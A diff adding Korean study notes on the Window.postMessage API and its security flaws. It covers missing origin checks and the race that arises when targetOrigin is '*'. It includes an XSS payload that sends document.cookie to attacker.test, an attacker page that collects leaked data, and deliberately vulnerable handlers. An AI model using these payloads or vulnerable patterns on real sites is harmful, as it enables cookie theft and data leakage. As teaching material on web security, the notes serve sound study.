@@ -1,0 +1,140 @@
+Window.postMessage API :
+    웹 초창기에는 프레임과 창들은 자유롭게 서로의 코드를 호출할 수 있었으나, 
+    SOP가 도입되면서 서로 다른 오리진들은 직접적으로 리소스를 공유하지 못하게 되었습니다.
+    이를 해결하기 위하여 Origin을 횡단하여 메시지를 주고받을 수 있는 API가 고안되었습니다.
+
+    메시지를 전송할 때에는 대상 윈도의 postMessage 메소드를 호출하며, 
+    수신하는 윈도는 message 전역 이벤트를 청취하여 메시지를 받을 수 있습니다.
+
+    1) targetWindow.postMessage(message, targetOrigin[, transfer])
+
+            변수                           설명
+
+        targetWindow             메시지를 보낼 대상 Window
+
+        message                 메시지 객체 (함수, DOM 객체 등은 보낼 수 없음)
+
+        targetOrigin            메시지 송신 시점에 targetWindow의 Origin이 targetOrigin과 일치하여야 함. targetOrigin에 "*"을 지정하면 Origin 검사가 이루어지지 않음.
+
+        transfer                (선택사항) ArrayBuffer나 canvas context 등 소유권을 전이할 객체의 배열을 지정.
+
+    2) message 이벤트 (MessageEvent)
+
+            고유 속성                       설명
+
+        origin                  메시지를 송신한 Origin 반환
+
+        source                  메시지를 송신한 Window 객체 반환
+
+        data                    복사된 메시지 객체 또는 값 반환
+
+    ex)
+        // 메시지 송신
+        targetWindow.postMessage(message, targetOrigin);
+        
+        // 메시지 수신
+        window.onmessage = function (e) {
+            if (e.origin === 'https://dreamhack.io') {
+                console.log(e.data);
+                e.source.postMessage('Hello, world!', e.origin);
+            }
+        }
+
+    postMessage 를 통해 message로 문자열뿐만 아니라 객체 또한 주고받을 수 있으나,
+    보안을 위해 함수(객체 메소드 포함), DOM 노드(요소 등) 객체, 프로토타입 및 get/set 속성 정보는 보낼 수 없습니다.
+
+    또한, 전송되는 모든 객체는 복사되므로 송신 후 객체를 변경하여도 수신하는 윈도에서는 변경 내용을 볼 수 없습니다.
+
+Window.postMessage 사용 시 취약점 - Origin 미확인
+    Window.postMessage API 사용 시 Origin을 명확히 지정 및 검사해야 합니다.
+    SOP를 우회하여 자유자재로 다른 윈도와 통신할 수 있도록 만들어진 API이기 때문에 Origin 검사 또한 웹 개발자의 책임이 됩니다.
+
+    특정 윈도는 모든 Origin에서 오는 메시지를 수신할 수 있는데,
+    이때 message 이벤트 핸들러에서 origin 속성을 검사하지 않고 메시지의 내용을 신뢰하면 보안 문제가 발생할 수 있습니다.
+
+    ex) 수신
+        // https://dreamhack.io
+        window.onmessage = function (e) {
+            var dialog = document.getElementById('my-dialog');
+            if (dialog == null) {
+                dialog = document.createElement('dialog');
+                dialog.id = 'my-dialog';
+                document.body.appendChild(dialog);
+            }
+            dialog.setAttribute('open', '');
+            dialog.innerHTML = e.data;
+        };
+
+    ex) 송신
+        // https://bob.dreamhack.io
+        parent.postMessage('<h1>안내</h1><p>작업이 완료되었습니다.</p>', 'https://dreamhack.io');
+
+    ex) hack
+        // https://attacker.test
+        parent.postMessage(`XSS attack<script>
+        new Image().src="https://attacker.test/retrieve?" + document.cookie);
+        alert(document.domain);
+        <${'/'}script>`, 'https://dreamhack.io');
+
+Window.postMessage 사용시 취약점 - Origin 전환 경합 조건
+    postMessage를 사용할 때 한 가지 기억해두어야 할 점은 메시지를 보내는 대상이 웹 문서가 아닌 창(윈도)이라는 것입니다.
+
+    웹 문서는 보통 그 출처가 고정되어 있는 반면, 창의 경우에는 사용자가 하이퍼링크를 방문하거나 스크립트가 다른 문서로 Redirect시켜 들어 있는 문서가 바뀔 수 있습니다.
+    이 상태에서 메시지를 보내게 되면 본래 의도하지 않은 Origin에 메시지가 누출되는 보안 문제가 발생할 수 있습니다.
+
+    postMessage의 두 번째 매개변수 targetOrigin에 대상 Origin 문자열을 명시하면 이 문제를 해결할 수 있습니다.
+    브라우저에서 메시지 송신 시점에서 Origin을 검사하여 일치하지 않는 경우 송신을 거부합니다. 
+    반면 "*"를 지정하는 것은 targetWindow의 Origin이 무엇이든지 상관없이 메시지가 보내지므로 권장하지 않습니다.
+
+    ex) https://dreamhack.io/ 예시
+
+        <!DOCTYPE html>
+        <title>검색 결과</title>
+        <script>
+        window.onmessage = function (e) {
+            if (e.origin === 'https://settings.dreamhack.io') {
+                document.getElementById('cur_set').textContent = e.data;
+            }
+        }
+        </script>
+        <a target="_blank" href="https://settings.dreamhack.io/">검색 설정 (현재: <span id="cur_set">0</span>)</a>
+        <ul>
+            <li><a href="https://attacker.test/entry" rel="noopener noreferrer nofollow">스폰서 링크</a></li> <!-- 공격자 페이지 -->
+        </ul>
+
+            noopener : 사용 안할시 연결중인 페이지에서 이전 페이지에 부분적으로 액세스 가능. (Console에서 window.opener로 데이터 확인)
+            noreferrer : 새로 열린 사이트가 window.opener 객체 조작하지 못하게함(noopener와 비슷),
+                        다른 페이지 탐색 시 브라우저가 참조 웹 페이지 주소 보내지 못함 (링크 클릭시 참조자 정보 숨김)
+            nofollow : SEO(검색 엔지 최적화)에서 페이지에 연결되는 가치있는 링크들이 중요(백링크).
+                        이 링크 주스(Link Juice)를 전달하지 않고 싶을때 사용
+
+    ex) https://settings.dreamhack.io/ 예시
+        
+        <!DOCTYPE html>
+        <form onsubmit="opener.postMessage(this.setting.value, '*');window.close();return false">
+            <input type="text" name="setting" value="0" />
+            <input type="submit" value="확인" />
+        </form>
+
+    ex) https://attacker.test/entry 예시
+        
+        <script>window.onmessage = function (e) {
+            alert('Current setting: ' + e.data);
+            new Image().src = "/retrieve?" + e.data;
+        };</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
